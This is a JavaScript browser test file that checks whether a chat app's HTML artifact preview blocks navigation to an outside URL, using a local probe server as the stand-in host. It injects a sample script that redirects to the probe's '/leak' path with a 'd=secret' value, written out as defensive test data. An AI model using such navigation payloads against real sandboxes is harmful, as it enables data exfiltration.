import http from "node:http";

// An HTML preview must not load another URL into its own frame, because the URL carries whatever
// the artifact code puts in it (#132). A local probe stands in for the outside host.
export default async function artifactNavigation({ page, origin, step, shot }) {
  const requests = [];
  const probe = http.createServer((request, response) => {
    requests.push(request.url);
    response.writeHead(200, { "content-type": "text/html" }).end("<h1>Probe page</h1>");
  });
  await new Promise((resolve) => probe.listen(0, "127.0.0.1", resolve));
  const probeOrigin = `http://127.0.0.1:${probe.address().port}`;
  const probeFrames = [];
  page.on("framenavigated", (frame) => {
    if (frame !== page.mainFrame() && frame.url().startsWith(probeOrigin)) probeFrames.push(frame.url());
  });
  const hits = (name) => requests.filter((url) => url.includes(`case=${name}`)).length;

  try {
    const control = await page.context().newPage();
    await control.goto(`${probeOrigin}/control`);
    await control.close();
    step("the probe logs a page visit from the browser", requests.includes("/control"), JSON.stringify(requests));

    const setup = await page.request.get(`${origin}/api/setup`);
    step("the setup API response has no page CSP", setup.ok() && setup.headers()["content-security-policy"] === undefined);

    await page.setViewportSize({ width: 1440, height: 900 });
    const { id } = await (await page.request.post(`${origin}/api/chats`)).json();
    await page.goto(`${origin}/missing-artifact-navigation-page`);
    const [chatDocument] = await Promise.all([
      page.waitForResponse((response) =>
        response.url() === `${origin}/c/${id}` && response.request().resourceType() === "document"
      ),
      page.getByRole("link", { name: "Back to chats" }).click(),
    ]);
    step("Back to chats loads a document with the page CSP", chatDocument.ok() && chatDocument.headers()["content-security-policy"] === "frame-src 'none'");
    const composer = page.getByPlaceholder("Ask anything");
    const reply = page.locator('[data-message-role="assistant"]').last();
    const panel = page.getByRole("complementary", { name: "Artifact", exact: true });
    await composer.fill("[qa:artifact-html]");
    await composer.press("Enter");
    await reply.getByRole("button", { name: "Regenerate", exact: true }).waitFor({ timeout: 30_000 });
    await reply.locator('[data-status="complete"]').waitFor({ timeout: 30_000 });
    await reply.getByRole("button", { name: "Preview", exact: true }).click();
    await page.locator('iframe[title="Artifact preview"]').waitFor({ timeout: 10_000 });

    // The thrown error reaches the panel through the frame's error report, so it proves the
    // artifact code ran up to the navigation.
    const leave = (name, delay) => {
      const go = `location.href = "${probeOrigin}/leak?case=${name}&d=secret"; throw new Error("navigation started: ${name}");`;
      return `<p>leaving</p>\n<script>\n${delay ? `setTimeout(() => { ${go} }, ${delay});` : go}\n</script>`;
    };
    async function check(label, name, open) {
      requests.length = 0;
      probeFrames.length = 0;
      await open();
      await panel.getByRole("alert").filter({ hasText: `navigation started: ${name}` }).waitFor({ timeout: 10_000 });
      step(`${label}: the artifact code reaches the navigation`, true);
      await page.waitForTimeout(1500);
      step(`${label}: no request reaches the probe`, hits(name) === 0, `${hits(name)} request(s)`);
      step(`${label}: the preview frame never shows the probe page`, probeFrames.length === 0, probeFrames.join(" "));
      await shot(`navigation-${label}`);
    }

    for (const [name, delay] of [["load", 0], ["delay", 300]]) {
      await check(name, name, async () => {
        await reply.getByRole("button", { name: "Edit code", exact: true }).click();
        await page.getByRole("textbox", { name: "Edit html block", exact: true }).fill(leave(name, delay));
        await page.getByRole("button", { name: "Save", exact: true }).click();
      });
    }
    await check("reload", "delay", () => panel.getByRole("button", { name: "Reload", exact: true }).click());
  } finally {
    probe.closeAllConnections();
    await new Promise((resolve) => probe.close(resolve));
  }
}
